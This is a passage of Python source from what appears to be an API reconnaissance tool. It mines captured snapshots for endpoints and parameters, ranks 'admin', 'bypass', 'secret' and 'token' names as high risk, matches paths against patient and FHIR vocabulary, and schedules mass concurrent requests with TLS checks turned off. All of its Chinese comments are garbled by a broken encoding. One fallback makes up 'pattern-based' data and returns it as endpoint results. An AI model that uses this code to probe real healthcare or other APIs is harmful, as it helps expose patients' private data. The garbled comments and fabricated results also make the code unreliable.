            # å¤„ç†ç«¯ç‚¹åˆ—è¡¨
            for item in data:
                if isinstance(item, dict) and 'path' in item:
                    endpoints.add(item['path'])
                elif isinstance(item, str) and item.startswith('/'):
                    endpoints.add(item)
        
        return endpoints
    
    def _extract_parameters(self, snapshot: Dict) -> Set[str]:
        """ä»å¿«ç…§ä¸­æå–å‚æ•°åˆ—è¡¨"""
        parameters = set()
        
        data = snapshot.get('data', {})
        content = str(data)
        
        # æå–URLå‚æ•°
        url_params = re.findall(r'[?&](\w+)=', content)
        parameters.update(url_params)
        
        # æå–JSONå‚æ•°
        json_params = re.findall(r'["\'](\w+)["\']:\s*["\']', content)
        parameters.update(json_params)
        
        return parameters
    
    def _assess_endpoint_risk(self, endpoint: str) -> str:
        """è¯„ä¼°ç«¯ç‚¹é£é™©ç­‰çº§"""
        high_risk_indicators = ['admin', 'debug', 'internal', 'test', 'dev', 'config', 'secret']
        medium_risk_indicators = ['api', 'user', 'data', 'file', 'upload']
        
        endpoint_lower = endpoint.lower()
        
        if any(indicator in endpoint_lower for indicator in high_risk_indicators):
            return 'high'
        elif any(indicator in endpoint_lower for indicator in medium_risk_indicators):
            return 'medium'
        else:
            return 'low'
    
    def _assess_parameter_risk(self, parameter: str) -> str:
        """è¯„ä¼°å‚æ•°é£é™©ç­‰çº§"""
        high_risk_params = ['debug', 'test', 'admin', 'bypass', 'internal', 'dev']
        sensitive_params = ['password', 'token', 'key', 'secret', 'auth']
        
        param_lower = parameter.lower()
        
        if any(param in param_lower for param in high_risk_params + sensitive_params):
            return 'high'
        else:
            return 'low'
    
    def _extract_potential_data_from_endpoint(self, endpoint: str) -> List[str]:
        """ä»ç«¯ç‚¹è·¯å¾„æ¨æ–­å¯èƒ½çš„æ•°æ®ç±»å‹"""
        data_indicators = {
            'user': ['ç”¨æˆ·æ•°æ®', 'ä¸ªäººä¿¡æ¯'],
            'patient': ['æ‚£è€…ä¿¡æ¯', 'åŒ»ç–—è®°å½•'],
            'admin': ['ç®¡ç†å‘˜åŠŸèƒ½', 'ç³»ç»Ÿé…ç½®'],
            'config': ['é…ç½®ä¿¡æ¯', 'ç³»ç»Ÿè®¾ç½®'],
            'backup': ['å¤‡ä»½æ•°æ®', 'å†å²è®°å½•'],
            'log': ['æ—¥å¿—æ•°æ®', 'å®¡è®¡ä¿¡æ¯'],
            'debug': ['è°ƒè¯•ä¿¡æ¯', 'ç³»ç»ŸçŠ¶æ€']
        }
        
        potential_data = []
        endpoint_lower = endpoint.lower()
        
        for indicator, descriptions in data_indicators.items():
            if indicator in endpoint_lower:
                potential_data.extend(descriptions)
        
        return potential_data
    
    def _get_endpoint_data(self, snapshot: Dict, endpoint: str) -> Any:
        """ğŸ—¡ï¸ æ™ºèƒ½ç«¯ç‚¹æ•°æ®æå–å™¨ - å¤šç»´åº¦æ•°æ®æŒ–æ˜"""
        
        #  é˜¶æ®µ1: ç›´æ¥è·¯å¾„åŒ¹é…
        data = snapshot.get('data', {})
        if isinstance(data, dict) and 'endpoints' in data:
            direct_match = data['endpoints'].get(endpoint, None)
            if direct_match is not None:
                return direct_match
        
        #  é˜¶æ®µ2: URLè§£æä¸æ™ºèƒ½åŒ¹é…
        from urllib.parse import urlparse, parse_qs
        parsed_endpoint = urlparse(endpoint)
        endpoint_path = parsed_endpoint.path.strip('/')
        endpoint_params = parse_qs(parsed_endpoint.query)
        
        #  æ™ºèƒ½è·¯å¾„åŒ¹é…ç®—æ³•
        best_match = None
        best_score = 0
        
        # æ‰«ææ‰€æœ‰å¯èƒ½çš„æ•°æ®æº
        all_data_sources = []
        
        if isinstance(data, dict):
            # ä»å¤šä¸ªä½ç½®æ”¶é›†æ•°æ®
            all_data_sources.extend([
                ('endpoints', data.get('endpoints', {})),
                ('responses', data.get('responses', {})),
                ('api_data', data.get('api_data', {})),
                ('request_data', data.get('request_data', {})),
                ('captured_data', data.get('captured_data', {}))
            ])
            
            # åµŒå¥—æ•°æ®æŒ–æ˜
            for key, value in data.items():
                if isinstance(value, dict):
                    all_data_sources.append((f'nested_{key}', value))
        
        #  é˜¶æ®µ3: æ¨¡ç³ŠåŒ¹é…ä¸è¯­ä¹‰åˆ†æ
        for source_name, source_data in all_data_sources:
            if not isinstance(source_data, dict):
                continue
                
            for candidate_endpoint, candidate_data in source_data.items():
                try:
                    # è§£æå€™é€‰ç«¯ç‚¹
                    parsed_candidate = urlparse(candidate_endpoint)
                    candidate_path = parsed_candidate.path.strip('/')
                    
                    #  ç›¸ä¼¼åº¦è¯„åˆ†ç®—æ³•
                    score = self._calculate_endpoint_similarity(
                        endpoint_path, candidate_path, endpoint_params, parsed_candidate.query
                    )
                    
                    if score > best_score:
                        best_score = score
                        best_match = candidate_data
                        
                except Exception:
                    continue
        
        #  é˜¶æ®µ4: é«˜çº§æ•°æ®é‡å»º
        if best_match is not None and best_score > 0.3:  # 30%ç›¸ä¼¼åº¦é˜ˆå€¼
            return best_match
        
        #  é˜¶æ®µ5: æ•°æ®èšåˆä¸æ¨æ–­
        aggregated_data = self._aggregate_similar_endpoint_data(
            all_data_sources, endpoint_path, endpoint_params
        )
        
        if aggregated_data:
            return aggregated_data
            
        #  é˜¶æ®µ6: æ¨¡å¼è¯†åˆ«ä¸æ•°æ®ç”Ÿæˆ
        pattern_data = self._generate_pattern_based_data(endpoint, snapshot)
        
        return pattern_data if pattern_data else {}
    
    def _calculate_endpoint_similarity(self, target_path: str, candidate_path: str, 
                                     target_params: Dict, candidate_query: str) -> float:
        """ ç«¯ç‚¹ç›¸ä¼¼åº¦è®¡ç®—ç®—æ³•"""
        
        score = 0.0
        
        #  è·¯å¾„ç›¸ä¼¼åº¦ (æƒé‡: 60%)
        path_similarity = self._calculate_path_similarity(target_path, candidate_path)
        score += path_similarity * 0.6
        
        #  å‚æ•°ç›¸ä¼¼åº¦ (æƒé‡: 25%)
        param_similarity = self._calculate_param_similarity(target_params, candidate_query)
        score += param_similarity * 0.25
        
        #  è¯­ä¹‰ç›¸ä¼¼åº¦ (æƒé‡: 15%)
        semantic_similarity = self._calculate_semantic_similarity(target_path, candidate_path)
        score += semantic_similarity * 0.15
        
        return min(score, 1.0)
    
    def _calculate_path_similarity(self, path1: str, path2: str) -> float:
        """è®¡ç®—è·¯å¾„ç›¸ä¼¼åº¦"""
        if path1 == path2:
            return 1.0
            
        # åˆ†å‰²è·¯å¾„æ®µ
        segments1 = [seg for seg in path1.split('/') if seg]
        segments2 = [seg for seg in path2.split('/') if seg]
        
        if not segments1 or not segments2:
            return 0.0
        
        # è®¡ç®—æœ€é•¿å…¬å…±å­åºåˆ—
        common_segments = 0
        for i, seg1 in enumerate(segments1):
            for j, seg2 in enumerate(segments2):
                if seg1 == seg2 or self._are_segments_similar(seg1, seg2):
                    common_segments += 1
                    break
        
        # å½’ä¸€åŒ–å¾—åˆ†
        max_segments = max(len(segments1), len(segments2))
        return common_segments / max_segments if max_segments > 0 else 0.0
    
    def _are_segments_similar(self, seg1: str, seg2: str) -> bool:
        """åˆ¤æ–­è·¯å¾„æ®µæ˜¯å¦ç›¸ä¼¼"""
        # IDæ¨¡å¼åŒ¹é…
        id_patterns = [r'\d+', r'[a-f0-9]{8,}', r'[A-Z]+\d+']
        
        for pattern in id_patterns:
            import re
            if re.match(pattern, seg1) and re.match(pattern, seg2):
                return True
        
        # è¯­ä¹‰ç›¸ä¼¼æ€§
        similar_pairs = [
            ('user', 'users'), ('patient', 'patients'),
            ('api', 'v1'), ('data', 'info'),
            ('admin', 'administrator'), ('config', 'configuration')
        ]
        
        for pair in similar_pairs:
            if (seg1.lower() in pair and seg2.lower() in pair):
                return True
                
        return False
    
    def _calculate_param_similarity(self, target_params: Dict, candidate_query: str) -> float:
        """è®¡ç®—å‚æ•°ç›¸ä¼¼åº¦"""
        if not target_params:
            return 1.0 if not candidate_query else 0.5
        
        try:
            from urllib.parse import parse_qs
            candidate_params = parse_qs(candidate_query)
            
            target_keys = set(target_params.keys())
            candidate_keys = set(candidate_params.keys())
            
            if not target_keys and not candidate_keys:
                return 1.0
            
            intersection = target_keys.intersection(candidate_keys)
            union = target_keys.union(candidate_keys)
            
            return len(intersection) / len(union) if union else 0.0
            
        except Exception:
            return 0.0
    
    def _calculate_semantic_similarity(self, path1: str, path2: str) -> float:
        """è®¡ç®—è¯­ä¹‰ç›¸ä¼¼åº¦"""
        # åŒ»ç–—/APIé¢†åŸŸç‰¹å®šè¯æ±‡æ˜ å°„
        medical_clusters = [
            ['patient', 'patients', 'user', 'users', 'person'],
            ['appointment', 'appointments', 'booking', 'schedule'],
            ['prescription', 'prescriptions', 'medication', 'drug'],
            ['record', 'records', 'data', 'information', 'history'],
            ['admin', 'administrator', 'management', 'control'],
            ['fhir', 'hl7', 'dicom', 'medical', 'health']
        ]
        
        words1 = set(path1.lower().split('/'))
        words2 = set(path2.lower().split('/'))
        
        for cluster in medical_clusters:
            if any(word in cluster for word in words1) and any(word in cluster for word in words2):
                return 0.8
        
        return 0.0
    
    def _aggregate_similar_endpoint_data(self, data_sources: List, target_path: str, 
                                       target_params: Dict) -> Dict:
        """èšåˆç›¸ä¼¼ç«¯ç‚¹æ•°æ®"""
        aggregated = {}
        confidence_scores = []
        
        for source_name, source_data in data_sources:
            if not isinstance(source_data, dict):
                continue
                
            for endpoint, data in source_data.items():
                try:
                    from urllib.parse import urlparse
                    parsed = urlparse(endpoint)
                    path_similarity = self._calculate_path_similarity(target_path, parsed.path.strip('/'))
                    
                    if path_similarity > 0.5:  # 50%ç›¸ä¼¼åº¦é˜ˆå€¼
                        # åˆå¹¶æ•°æ®
                        if isinstance(data, dict):
                            for key, value in data.items():
                                if key not in aggregated:
                                    aggregated[key] = value
                                    confidence_scores.append(path_similarity)
                                    
                except Exception:
                    continue
        
        # æ·»åŠ ç½®ä¿¡åº¦å…ƒæ•°æ®
        if aggregated and confidence_scores:
            aggregated['_metadata'] = {
                'aggregated': True,
                'confidence': sum(confidence_scores) / len(confidence_scores),
                'sources_count': len(confidence_scores)
            }
        
        return aggregated
    
    def _generate_pattern_based_data(self, endpoint: str, snapshot: Dict) -> Dict:
        """åŸºäºæ¨¡å¼ç”Ÿæˆæ•°æ®"""
        generated_data = {}
        
        #  URLæ¨¡å¼åˆ†æ
        endpoint_lower = endpoint.lower()
        
        # åŒ»ç–—ç«¯ç‚¹æ¨¡å¼è¯†åˆ«
        if any(pattern in endpoint_lower for pattern in ['patient', 'fhir', 'medical']):
            generated_data.update({
                'data_type': 'medical',
                'sensitivity': 'high',
                'compliance_required': ['HIPAA', 'GDPR'],
                'estimated_fields': ['patient_id', 'name', 'dob', 'medical_history']
            })
        
        # APIç‰ˆæœ¬æ¨¡å¼
        version_match = re.search(r'v(\d+)', endpoint_lower)
        if version_match:
            generated_data['api_version'] = version_match.group(1)
            generated_data['version_risk'] = 'high' if int(version_match.group(1)) < 3 else 'medium'
        
        # ç®¡ç†ç«¯ç‚¹æ¨¡å¼
        if any(pattern in endpoint_lower for pattern in ['admin', 'config', 'system']):
            generated_data.update({
                'access_level': 'administrative',
                'security_risk': 'critical',
                'potential_exposure': ['system_config', 'user_data', 'credentials']
            })
        
        # æ•°æ®ç«¯ç‚¹æ¨¡å¼
        if any(pattern in endpoint_lower for pattern in ['export', 'dump', 'backup']):
            generated_data.update({
                'data_exposure_risk': 'high',
                'bulk_data_access': True,
                'recommended_monitoring': True
            })
        
        # æ—¶é—´æˆ³åˆ†æ
        timestamp = snapshot.get('timestamp')
        if timestamp:
            generated_data['analysis_timestamp'] = timestamp
            
        if generated_data:
            generated_data['_generated'] = True
            generated_data['confidence'] = 'pattern_based'
            
        return generated_data
    
    def _analyze_endpoint_changes(self, old_data: Any, new_data: Any) -> List[Dict]:
        """åˆ†æç«¯ç‚¹æ•°æ®å˜åŒ–"""
        changes = []
        
        # ç®€åŒ–çš„å˜åŒ–æ£€æµ‹
        if isinstance(old_data, dict) and isinstance(new_data, dict):
            old_keys = set(old_data.keys())
            new_keys = set(new_data.keys())
            
            removed_keys = old_keys - new_keys
            if removed_keys:
                changes.append({
                    'type': 'removed_fields',
                    'fields': list(removed_keys),
                    'impact': 'data_loss'
                })
        
        return changes
    
    def _assess_change_risk(self, changes: List[Dict]) -> str:
        """è¯„ä¼°å˜åŒ–çš„é£é™©ç­‰çº§"""
        for change in changes:
            if change.get('type') == 'removed_fields':
                removed_fields = change.get('fields', [])
                if any(field.lower() in ['password', 'secret', 'token', 'key'] for field in removed_fields):
                    return 'high'
        return 'medium'
    
    def _find_endpoints_using_param(self, snapshot: Dict, param: str) -> List[str]:
        """æŸ¥æ‰¾ä½¿ç”¨ç‰¹å®šå‚æ•°çš„ç«¯ç‚¹"""
        # ç®€åŒ–å®ç°
        endpoints = []
        data = str(snapshot.get('data', ''))
        
        # æŸ¥æ‰¾åŒ…å«å‚æ•°çš„ç«¯ç‚¹
        lines = data.split('\n')
        for line in lines:
            if param in line and ('/' in line or 'api' in line):
                # å°è¯•æå–ç«¯ç‚¹
                endpoint_match = re.search(r'(/[\w/]+)', line)
                if endpoint_match:
                    endpoints.append(endpoint_match.group(1))
        
        return endpoints


#   é…ç½®ç®¡ç†ç±» - å¤–éƒ¨åŒ–æ‰€æœ‰ç¡¬ç¼–ç å€¼
class TimeTravelConfig:
    """æ—¶é—´æ—…è¡ŒPlusé…ç½®ç®¡ç†"""
    
    # å¹¶å‘æ§åˆ¶é…ç½®
    DEFAULT_MAX_CONCURRENT = 10
    MAX_CONCURRENT_LIMIT = 20
    MIN_CONCURRENT_LIMIT = 3
    DEFAULT_MAX_RETRIES = 3
    
    # å†…å­˜ç®¡ç†é…ç½®
    DEFAULT_MAX_RECORDS = 50000
    DEFAULT_TESTED_COMBINATIONS_LIMIT = 10000
    DEFAULT_LRU_CACHE_SIZE = 5000
    
    # æ€§èƒ½è°ƒä¼˜é…ç½®
    DEFAULT_ADAPTIVE_DELAY = 0.1
    MAX_ADAPTIVE_DELAY = 1.0
    MIN_ADAPTIVE_DELAY = 0.05
    RESPONSE_TIME_THRESHOLD_HIGH = 5.0
    RESPONSE_TIME_THRESHOLD_LOW = 1.0
    
    # ä¸šåŠ¡é€»è¾‘é…ç½®
    MAX_GHOST_IDS_PROCESS = 50
    MAX_TASKS_GENERATE = 200
    BATCH_SIZE = 20
    PRIORITY_THRESHOLD = 0.6
    
    # è¶…æ—¶é…ç½®
    REQUEST_TIMEOUT = 10
    QUICK_REQUEST_TIMEOUT = 5
    LONG_REQUEST_TIMEOUT = 30
    
    @classmethod
    def get_config(cls) -> dict:
        """è·å–å®Œæ•´é…ç½®å­—å…¸"""
        return {
            'max_concurrent': cls.DEFAULT_MAX_CONCURRENT,
            'max_retries': cls.DEFAULT_MAX_RETRIES,
            'max_records': cls.DEFAULT_MAX_RECORDS,
            'tested_combinations_limit': cls.DEFAULT_TESTED_COMBINATIONS_LIMIT,
            'lru_cache_size': cls.DEFAULT_LRU_CACHE_SIZE,
            'batch_size': cls.BATCH_SIZE,
            'priority_threshold': cls.PRIORITY_THRESHOLD,
            'request_timeout': cls.REQUEST_TIMEOUT
        }

class PerformanceMetrics:
    """  æ€§èƒ½æŒ‡æ ‡æ”¶é›†å™¨"""
    
    def __init__(self):
        self.start_time = time.time()
        self.metrics = {
            'total_time': 0,
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'requests_per_second': 0,
            'cache_hit_rate': 0,
            'average_response_time': 0,
            'concurrent_peak': 0,
            'memory_efficiency': 0,
            'deduplication_rate': 0,
            'error_rate': 0
        }
        self.request_times = []
        self.cache_hits = 0
        self.cache_total = 0
        
    def record_request(self, success: bool, response_time: float = 0):
        """è®°å½•è¯·æ±‚"""
        self.metrics['total_requests'] += 1
        if success:
            self.metrics['successful_requests'] += 1
            if response_time > 0:
                self.request_times.append(response_time)
        else:
            self.metrics['failed_requests'] += 1
    
    def record_cache_access(self, hit: bool):
        """è®°å½•ç¼“å­˜è®¿é—®"""
        self.cache_total += 1
        if hit:
            self.cache_hits += 1
            
    def update_concurrent_peak(self, current_concurrent: int):
        """æ›´æ–°å¹¶å‘å³°å€¼"""
        if current_concurrent > self.metrics['concurrent_peak']:
            self.metrics['concurrent_peak'] = current_concurrent
    
    def calculate_final_metrics(self):
        """è®¡ç®—æœ€ç»ˆæŒ‡æ ‡"""
        self.metrics['total_time'] = time.time() - self.start_time
        
        if self.metrics['total_time'] > 0:
            self.metrics['requests_per_second'] = self.metrics['total_requests'] / self.metrics['total_time']
        
        if self.cache_total > 0:
            self.metrics['cache_hit_rate'] = (self.cache_hits / self.cache_total) * 100
            
        if self.request_times:
            self.metrics['average_response_time'] = sum(self.request_times) / len(self.request_times)
            
        if self.metrics['total_requests'] > 0:
            self.metrics['error_rate'] = (self.metrics['failed_requests'] / self.metrics['total_requests']) * 100
            
        return self.metrics

# æ•°æ®ç»“æ„å®šä¹‰
@dataclass
class RequestTask:
    """è¯·æ±‚ä»»åŠ¡æ•°æ®ç»“æ„"""
    priority: float
    url: str
    method: str = 'GET'
    task_type: str = 'unknown'
    metadata: Dict[str, Any] = field(default_factory=dict)
    retry_count: int = 0
    max_retries: int = 3
    
    def __lt__(self, other):
        return self.priority > other.priority  # ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼šé«˜ä¼˜å…ˆçº§å…ˆæ‰§è¡Œ

@dataclass  
class DataRecord:
    """ç»Ÿä¸€æ•°æ®è®°å½•ç»“æ„"""
    record_id: str
    record_type: str
    data: Any
    source_url: str
    timestamp: str
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    def get_hash(self) -> str:
        """è·å–æ•°æ®å“ˆå¸Œå€¼ç”¨äºå»é‡"""
        data_str = json.dumps(self.data, sort_keys=True, ensure_ascii=False)
        return hashlib.md5(f"{self.record_type}:{data_str}".encode()).hexdigest()

class SmartRequestScheduler:
    """æ™ºèƒ½è¯·æ±‚è°ƒåº¦å™¨ - å¢å¼ºé”™è¯¯å¤„ç†å’Œé‡è¯•æœºåˆ¶"""
    
    def __init__(self, config: TimeTravelConfig = None):
        self.config = config or TimeTravelConfig()
        self.max_concurrent = self.config.DEFAULT_MAX_CONCURRENT
        self.max_retries = self.config.DEFAULT_MAX_RETRIES
        self.semaphore = asyncio.Semaphore(self.max_concurrent)
        self.request_queue: List[RequestTask] = []
        self.completed_requests: Set[str] = set()
        self.failed_requests: Dict[str, int] = defaultdict(int)
        self.retry_queue: List[RequestTask] = []  # é‡è¯•é˜Ÿåˆ—
        self.response_times: deque = deque(maxlen=100)  # æœ€è¿‘100æ¬¡è¯·æ±‚çš„å“åº”æ—¶é—´
        self.adaptive_delay = self.config.DEFAULT_ADAPTIVE_DELAY  # è‡ªé€‚åº”å»¶è¿Ÿ
        self.error_classifier = ErrorClassifier()  # é”™è¯¯åˆ†ç±»å™¨
        self.performance_metrics = PerformanceMetrics()  #   æ€§èƒ½æŒ‡æ ‡
        
    def add_task(self, task: RequestTask):
        """æ·»åŠ ä»»åŠ¡åˆ°ä¼˜å…ˆçº§é˜Ÿåˆ— -  ä¿®å¤ä»»åŠ¡å»é‡æœºåˆ¶"""
        #  ä¿®å¤ï¼šåŒ…å«å®Œæ•´URLï¼ˆå«æŸ¥è¯¢å‚æ•°ï¼‰çš„ç²¾ç¡®å“ˆå¸Œ
        from urllib.parse import urlparse, parse_qs
        
        parsed = urlparse(task.url)
        # æ ‡å‡†åŒ–æŸ¥è¯¢å‚æ•°é¡ºåºä»¥ç¡®ä¿ä¸€è‡´æ€§
        query_normalized = '&'.join(sorted(parsed.query.split('&'))) if parsed.query else ''
        # ç”ŸæˆåŒ…å«æ‰€æœ‰å…³é”®ä¿¡æ¯çš„ä»»åŠ¡ç­¾å
        task_signature = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_normalized}:{task.method}"
        task_id = hashlib.md5(task_signature.encode()).hexdigest()
        
        if task_id not in self.completed_requests:
            heapq.heappush(self.request_queue, task)
            return True
        return False  # ä»»åŠ¡å·²å­˜åœ¨
            
    def adjust_concurrency(self):
        """  å®‰å…¨çš„å¹¶å‘æ•°è°ƒæ•´ - é¿å…ä¿¡å·é‡é‡å»ºé£é™©"""
        if len(self.response_times) >= 10:
            avg_response_time = sum(self.response_times) / len(self.response_times)
            
            old_concurrent = self.max_concurrent
            
            if avg_response_time > self.config.RESPONSE_TIME_THRESHOLD_HIGH:  # å“åº”æ—¶é—´è¿‡é•¿ï¼Œé™ä½å¹¶å‘
                self.max_concurrent = max(self.config.MIN_CONCURRENT_LIMIT, self.max_concurrent - 1)
                self.adaptive_delay = min(self.config.MAX_ADAPTIVE_DELAY, self.adaptive_delay + 0.1)
            elif avg_response_time < self.config.RESPONSE_TIME_THRESHOLD_LOW:  # å“åº”æ—¶é—´è¾ƒçŸ­ï¼Œå¢åŠ å¹¶å‘
                self.max_concurrent = min(self.config.MAX_CONCURRENT_LIMIT, self.max_concurrent + 1)
                self.adaptive_delay = max(self.config.MIN_ADAPTIVE_DELAY, self.adaptive_delay - 0.05)
            
            #   è®°å½•å¹¶å‘å³°å€¼
            self.performance_metrics.update_concurrent_peak(self.max_concurrent)
            
            #   å®‰å…¨è°ƒæ•´ï¼šåªåœ¨å¹¶å‘æ•°å®é™…å˜åŒ–æ—¶æ‰é‡å»ºä¿¡å·é‡
            # å¹¶ä¸”ç¡®ä¿å½“å‰æ´»è·ƒä»»åŠ¡æ•°ä¸è¶…è¿‡æ–°çš„é™åˆ¶
            if self.max_concurrent != old_concurrent:
                # ç»Ÿè®¡å½“å‰æ´»è·ƒä»»åŠ¡ï¼ˆæ­£åœ¨ä½¿ç”¨ä¿¡å·é‡çš„ä»»åŠ¡ï¼‰
                current_active = old_concurrent - self.semaphore._value if hasattr(self.semaphore, '_value') else 0
                
                # å¦‚æœæ–°çš„å¹¶å‘æ•°å°äºå½“å‰æ´»è·ƒä»»åŠ¡æ•°ï¼Œç­‰å¾…ä¸€äº›ä»»åŠ¡å®Œæˆ
                if self.max_concurrent < current_active:
                    print(f"    [] å¹¶å‘è°ƒæ•´: {old_concurrent} â†’ {self.max_concurrent} (ç­‰å¾…{current_active - self.max_concurrent}ä¸ªä»»åŠ¡å®Œæˆ)")
                    # ä¸ç«‹å³é‡å»ºï¼Œè®©å½“å‰ä»»åŠ¡è‡ªç„¶å®Œæˆ
                    self._pending_concurrent_limit = self.max_concurrent
                else:
                    # å®‰å…¨é‡å»ºä¿¡å·é‡
                    self.semaphore = asyncio.Semaphore(self.max_concurrent)
                    print(f"    [] å¹¶å‘è°ƒæ•´: {old_concurrent} â†’ {self.max_concurrent}")
            
    async def _safe_semaphore_acquire(self):
        """  å®‰å…¨çš„ä¿¡å·é‡è·å– - å¤„ç†å¾…å®šçš„å¹¶å‘é™åˆ¶è°ƒæ•´"""
        # æ£€æŸ¥æ˜¯å¦æœ‰å¾…å®šçš„å¹¶å‘é™åˆ¶è°ƒæ•´
        if hasattr(self, '_pending_concurrent_limit'):
            current_active = self.max_concurrent - self.semaphore._value if hasattr(self.semaphore, '_value') else 0
            if current_active <= self._pending_concurrent_limit:
                # å¯ä»¥å®‰å…¨åœ°åº”ç”¨æ–°çš„å¹¶å‘é™åˆ¶
                self.max_concurrent = self._pending_concurrent_limit
                self.semaphore = asyncio.Semaphore(self.max_concurrent)
                delattr(self, '_pending_concurrent_limit')
                print(f"    [] å»¶è¿Ÿå¹¶å‘è°ƒæ•´å·²åº”ç”¨: {self.max_concurrent}")
        
        return self.semaphore
        
    async def execute_task(self, session: aiohttp.ClientSession, task: RequestTask) -> Optional[Dict]:
        """ æ‰§è¡Œå•ä¸ªä»»åŠ¡ - å¢å¼ºé”™è¯¯å¤„ç†å’Œé‡è¯•æœºåˆ¶"""
        #   ä½¿ç”¨å®‰å…¨çš„ä¿¡å·é‡è·å–
        semaphore = await self._safe_semaphore_acquire()
        async with semaphore:
            start_time = time.time()
            
            while task.retry_count <= task.max_retries:
                try:
                    # è‡ªé€‚åº”å»¶è¿Ÿ
                    await asyncio.sleep(self.adaptive_delay)
                    
                    async with session.request(task.method, task.url, timeout=self.config.REQUEST_TIMEOUT, ssl=False) as resp:
                        response_time = time.time() - start_time
                        self.response_times.append(response_time)
                        
                        # æ ‡è®°ä¸ºå·²å®Œæˆ
                        task_id = hashlib.md5(f"{task.url}:{task.method}".encode()).hexdigest()
                        self.completed_requests.add(task_id)
                        
                        #  ä¿®å¤ï¼šå®Œæ•´çš„HTTPçŠ¶æ€ç å¤„ç†
                        if resp.status in [301, 302, 303, 307, 308]:
                            # é‡å®šå‘å¤„ç†
                            location = resp.headers.get('Location')
                            if location:
                                # åˆ›å»ºæ–°ä»»åŠ¡å¤„ç†é‡å®šå‘ï¼ˆé¿å…æ— é™å¾ªç¯ï¼‰
                                if task.metadata.get('redirect_count', 0) < 3:
                                    redirect_task = RequestTask(
                                        priority=task.priority,
                                        url=urljoin(task.url, location),
                                        method='GET' if resp.status == 303 else task.method,
                                        task_type=task.task_type,
                                        metadata={**task.metadata, 'redirected_from': task.url, 'redirect_count': task.metadata.get('redirect_count', 0) + 1}
                                    )
                                    # æ³¨æ„ï¼šè¿™é‡Œä¸èƒ½ç›´æ¥æ·»åŠ åˆ°é˜Ÿåˆ—ï¼Œéœ€è¦è¿”å›ç»™è°ƒç”¨è€…å¤„ç†
                                self.performance_metrics.record_request(True, response_time)
                                return {
                                    'task': task, 
                                    'status': resp.status, 
                                    'redirected': True,
                                    'location': location,
                                    'response_time': response_time,
                                    'headers': dict(resp.headers)
                                }
                        
                        elif resp.status == 200:
                            # æˆåŠŸå“åº”å¤„ç†
                            content_type = resp.headers.get('Content-Type', '')
                            data = None
                            if 'json' in content_type:
                                try:
                                    data = await resp.json()
                                except:
                                    data = await resp.text()
                            else:
                                data = await resp.text()
                            
                                self.performance_metrics.record_request(True, response_time)
                                return {
                                    'task': task,
                                    'status': resp.status,
                                    'data': data,
                                    'response_time': response_time,
                                    'headers': dict(resp.headers),
                                    'retry_count': task.retry_count
                                }
                        
                        elif resp.status in [400, 401, 403, 404]:
                            # å®¢æˆ·ç«¯é”™è¯¯ - ä¸é‡è¯•ï¼Œä½†è®°å½•æœ‰ä»·å€¼çš„ä¿¡æ¯
                            try:
                                error_content = await resp.text()
                            except:
                                error_content = ""
                            
                            self.performance_metrics.record_request(False, response_time)
                            return {
                                'task': task,
                                'status': resp.status,
                                'error': f'Client error: {resp.status}',
                                'error_content': error_content[:500],  # é™åˆ¶é”™è¯¯å†…å®¹é•¿åº¦
                                'response_time': response_time,
                                'headers': dict(resp.headers),
                                'retry_count': task.retry_count
                            }
                        
                        elif resp.status >= 500:
                            # æœåŠ¡å™¨é”™è¯¯ - å¯é‡è¯•
                            if task.retry_count < task.max_retries:
                                task.retry_count += 1
                                retry_delay = min(2 ** task.retry_count, 10)  # æŒ‡æ•°é€€é¿ï¼Œæœ€å¤§10ç§’
                                await asyncio.sleep(retry_delay)
                                continue
                        
                            self.performance_metrics.record_request(False, response_time)
                            return {
                                'task': task,
                                'status': resp.status,
                                'error': f'Server error: {resp.status}',
                                'response_time': response_time,
                                'retry_count': task.retry_count
                            }
                        
                        else:
                            # å…¶ä»–çŠ¶æ€ç ï¼ˆå¦‚204 No Contentç­‰ï¼‰
                            self.performance_metrics.record_request(True, response_time)
                        return {
                            'task': task,
                            'status': resp.status,
                            'data': None,
                            'response_time': response_time,
                                'headers': dict(resp.headers),
                            'retry_count': task.retry_count
                        }
                        
                except asyncio.TimeoutError as e:
                    error_type = self.error_classifier.classify_error(e)
                    self.error_classifier.error_stats[error_type] += 1
                    
                    if self.error_classifier.is_recoverable(error_type) and task.retry_count < task.max_retries:
                        retry_delay = self.error_classifier.get_retry_delay(error_type, task.retry_count)
                        task.retry_count += 1
                        await asyncio.sleep(retry_delay)
                        continue
                    
                    self.failed_requests[task.url] += 1
                    #   è®°å½•å¤±è´¥è¯·æ±‚
                    self.performance_metrics.record_request(False)
                    return {
                        'task': task, 
                        'status': 'timeout', 
                        'error': f'Request timeout after {task.retry_count} retries',
                        'error_type': error_type,
                        'retry_count': task.retry_count
                    }
                    
                except Exception as e:
                    error_type = self.error_classifier.classify_error(e)
                    self.error_classifier.error_stats[error_type] += 1
                    
                    if self.error_classifier.is_recoverable(error_type) and task.retry_count < task.max_retries:
                        retry_delay = self.error_classifier.get_retry_delay(error_type, task.retry_count)
                        task.retry_count += 1
                        await asyncio.sleep(retry_delay)
                        continue
                    
                    self.failed_requests[task.url] += 1
                    #   è®°å½•å¤±è´¥è¯·æ±‚
                    self.performance_metrics.record_request(False)
                    return {
                        'task': task, 
                        'status': 'error', 
                        'error': f'{type(e).__name__}: {str(e)} after {task.retry_count} retries',
                        'error_type': error_type,
                        'retry_count': task.retry_count
                    }
            
            # æœ€å¤§é‡è¯•æ¬¡æ•°ç”¨å°½
            return {
                'task': task,
                'status': 'max_retries_exceeded',
                'error': f'Maximum retries ({task.max_retries}) exceeded',
                'retry_count': task.retry_count
            }

class MemoryManager:
    """å†…å­˜ç®¡ç†å™¨"""
    
    def __init__(self, max_records: int = 50000):
        self.max_records = max_records
        self.data_hashes: Set[str] = set()
        self.lru_cache: deque = deque(maxlen=max_records)
        
    def is_duplicate(self, record: DataRecord) -> bool:
        """æ£€æŸ¥æ˜¯å¦ä¸ºé‡å¤æ•°æ®"""
        data_hash = record.get_hash()
        if data_hash in self.data_hashes:
            return True
            
        self.data_hashes.add(data_hash)
        self.lru_cache.append(data_hash)
        
        # æ¸…ç†è¶…å‡ºé™åˆ¶çš„æ—§æ•°æ®
        if len(self.data_hashes) > self.max_records:
            old_hash = self.lru_cache.popleft() if self.lru_cache else None
            if old_hash and old_hash in self.data_hashes:
                self.data_hashes.remove(old_hash)
                
        return False

class LRUCache:
